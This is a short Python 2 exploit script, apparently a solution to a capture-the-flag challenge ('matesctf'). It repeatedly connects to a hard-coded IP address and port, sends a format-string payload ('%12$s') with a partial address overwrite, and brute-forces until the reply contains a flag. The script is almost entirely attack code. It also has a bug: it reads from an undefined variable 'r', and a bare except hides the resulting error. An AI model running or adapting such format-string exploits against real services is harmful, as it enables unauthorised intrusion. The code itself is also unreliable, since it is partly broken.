import telnetlib
import socket
import struct 
import time

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data
i = 0
while True:
	host = "125.235.240.168"
	port = 27017
	s = socket.create_connection((host, port))
	print i
	i += 1
	payload = '%12$s'
	payload = payload.ljust(0x30,'B')
	payload += "\xf0\x41"
	
	recvuntil("It's time to cast your spell\n")
	s.send(payload)
	try:
		msg = r.recv()
		#print msg
		if "matesctf{" in msg and "matesctf{}" not in msg:
			print msg
			break
		s.close()
	except:
		s.close()	
